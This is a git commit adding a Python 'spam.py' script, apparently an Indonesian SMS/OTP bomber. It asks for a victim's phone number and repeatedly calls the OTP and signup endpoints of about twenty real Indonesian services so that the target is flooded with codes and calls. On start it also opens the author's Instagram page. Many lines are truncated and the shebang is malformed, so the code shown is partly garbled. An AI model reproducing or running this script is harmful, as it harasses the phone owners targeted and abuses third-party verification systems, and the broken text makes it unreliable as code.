badf11b3f9d959262bd6182b21e2c86a83fddeca
Fiqi-Ganz7 <95555507+Fiqi-WibuSoft@users.noreply.github.com>
2021-12-28 11:59:00 +0000

    Create spam.py

---
+++ spam.py
@@ -0,0 +1,144 @@
+n/urs/python
+#mau recode ya?
+#recode aje nyet
+#ambil data nya trus ketik sendiri monggo lu pinter
+#copas tolol
+
+#warna
+b='\033[34;1m' #biru                                                                                                  hi='\033[32;1m' #hijau
+u='\033[35;1m' #ungu
+c='\033[36;1m' #cyan
+m='\033[31;1m' #merah                                                                                                 p='\033[37;1m' #putih
+k='\033[33;1m' #kuning
+H='\033[90m' #hitam
+en='\n' #enter
+sp='\t' #spasi
+
+#mulai
+def mengetik(s):
+    for c in s + '\n' :
+        sys.stdout.write(c)
+        sys.stdout.flush()
+        time.sleep(3. / 100)
+
+
+import os,sys,json,time
+try:
+        import requests as reek
+        req=reek.Session()
+except ModuleNotFoundError:os.system("python -m pip install requests") ; os.system(f"python {sys.arg                 >
+class nyepam:
+        def __init__(self,_8,_08,_62):
+                self._8,self._08,self._62=_8,_08,_62
+        def mulai(self):
+                try:
+                        for x in range(2):
+                                send=req.post("https://cmsapi.mapclub.com/api/signup-otp",data={"pho                 >
+                                if "ok" in send:continue
+                                else:break
+                        for x in range(2):
+                                send=req.post("https://api.adakami.id/adaKredit/pesan/kodeVerifikasi                 >
+                                if "Permintaan kode verifikasi sudah melebihi batas. Silakan coba la                 >
+                                else:continue
+                        for x in range(2):
+                                send=json.loads(reek.get(f"https://id.jagreward.com/member/verify-mo                 >
+                                if send["message"]=="Anda akan menerima sebuah panggilan dari sistem                 >
+                                else:break
+                        for x in range(15):
+                                send=req.post("https://tokomanamana.com/ma/auth/request_token_mercha                 >
+                                if "Kode OTP berhasil dikirim!" in send:continue
+                                else:break
+                        for x in range(2):
+                                send=req.post("https://identity-gateway.oyorooms.com/identity/api/v1                 >
+                                if "SUCCESSFULLY GENERATED OTP " in send:continue
+                                else:break
+                        for x in range(2):
+                                send=req.post("https://app.cairin.id/v1/app/sms/sendCaptcha",data={"                 >
+                                if "leftTimes" in send:continue
+                                else:break
+                        for x in range(2):
+                                send=req.post("https://www.olx.co.id/api/auth/authenticate",data=jso                 >
+                                if "status" in send:continue
+                                else:break
+                        for x in range(2):
+                                send=req.post("https://auth.dekoruma.com/api/v1/register/request-otp                 >
+                                if "" in send:continue
+                                else:break
+                        for x in range(2):
+                                send=req.post("https://api.payfazz.com/v2/phoneVerifications",data={                 >
+                                if "phoneVerificationId" in send:continue
+                                else:break
+                        for x in range(2):
+                                send=req.post("https://harvestcakes.com/register",data={"phone":self                 >
+                                if "function" in send:continue
+                                else:break
+                        for x in range(2):
+                                send=reek.get("https://api.danacita.co.id/users/send_otp/?mobile_pho                 >
+                                load=json.loads(send.text)
+                                if load["detail"] == "Successfully sent OTP SMS":continue
+                                else:break
+                        for x in range(2):
+                                send=req.post("https://api.gojekapi.com/v5/customers", data={"email": "nsjwwiwiwisnsn>
+                                if "success" in send:continue                                                                                         else:break
+                        for x in range(5):
+                                send=req.post("https://u.icq.net/api/v14/rapi/auth/sendCode", data=json.dumps({"reqId>
+                                if "results" in send:continue                                                                                         else:break
+                        for x in range(2):
+                                send=reek.get(f"https://japi.maucash.id/welab-user/api/v1/send-sms-code?mobile={self.>
+                                if "Permintaan berhasil" in send:continue
+                                else:break
+                        for x in range(2):
+                                a=reek.get("https://www.matahari.com/customer/account/create/")
+                                b=a.cookies["PHPSESSID"]
+                                send=req.post("https://www.matahari.com/rest/V1/thorCustomers",data=json.dumps({"thor>
+                                if "Success" in send:continue
+                                else:break
+                        for x in range(2):
+                                send=req.post("https://api.btpn.com/jenius", json.dumps({"query": "mutation registerP>
+                                if "registerPhone" in send:continue
+                                else:break
+                        for x in range(5):
+                                send=req.post("https://app-api.kredito.id/client/v1/common/verify-code/send",'{"event>
+                                if "sukses" in send:continue
+                                else:break
+                        for x in range(15):
+                                send=req.post("https://tokomanamana.com/ma/auth/request_token_merchant/",data={"phone>
+                                if "Kode OTP berhasil dikirim!" in send:continue
+                                else:break
+                        exit("\e[32m\nINGFO: \n       \x1b[0;36m[\x1b[0;37mTerget\x1b[0;36m] : $phone\n       \x1b[0;>
+                except reek.exceptions.ReadTimeout:exit("\x1b[0;31mSinyal Tidak Stabil")
+                except reek.exceptions.ConnectionError:exit("\x1b[0;31mSinyal Error")
+                except (KeyboardInterrupt,EOFError):exit("[!] Exit")
+__import__("os").system("clear")
+os.system("xdg-open https://instagram.com/hyputganz_")
+range(5)
+mengetik (f"""
+{sp}{u} [{H}×{u}]{k}Author {H}: {k}FiqX54NZ
+{sp}{u} [{H}×{u}]{k}Team   {H}: {k}Banyumas Cyber Team
+{sp}{u} [{H}×{u}]{k}Wa     {H}: {k}+6283125187277
+{sp}{u} [{H}×{u}]{k}Ig     {H}: {k}@hyputganz_
+{u}╔═══╗╔═══╗╔═══╗╔═╗╔═╗  {u}╔═══╗╔═╗╔═╗╔═══╗
+{u}║╔═╗║║╔═╗║║╔═╗║║║╚╝║║  {u}║╔═╗║║║╚╝║║║╔═╗║
+{u}║╚══╗║╚═╝║║║─║║║╔╗╔╗║  {u}║╚══╗║╔╗╔╗║║╚══╗
+{u}╚══╗║║╔══╝║╚═╝║║║║║║║  {u}╚══╗║║║║║║║╚══╗║
+{u}║╚═╝║║║───║╔═╗║║║║║║║  {u}║╚═╝║║║║║║║║╚═╝║
+{u}╚═══╝╚╝───╚╝─╚╝╚╝╚╝╚╝  {u}╚═══╝╚╝╚╝╚╝╚═══╝{en}
+{H}══════════════════════════════════════════
+{k}      [ {H}Example : 0831****      {k}]
+{k}      [ {H}Gak untuk salah gunakan {k}]
+{H}      ═══════════════════════════\n
+""")
+while True:
+        try:
+                a=input("\033[36m[\033[33m?\033[36m] Nomor \033[90m: \033[32m")
+                asu=a[0:2]
+                if a in(""," "):print("\033[36m[\033[33m!\033[36m] \033[32mNomor nya masukin kalau enggak gw jitak lu>
+                elif "08" not in asu:print("\033[36m[\033[33m!\033[36m] \033[32mMasukin nomor awalan 08 seperti conto>
+                elif len(a)<=10:print("\033[36m[\033[33m!\033[36m] \033[32mNomor Bener Tapi kurang angka!")
+                else:
+                        b=a[1:12]
+                        c="62"+b
+                        nyepam(b,a,c).mulai()
+                        break
+        except Exception as ex:exit(str(ex))
+        except (KeyboardInterrupt,EOFError):exit("[!] Exit")
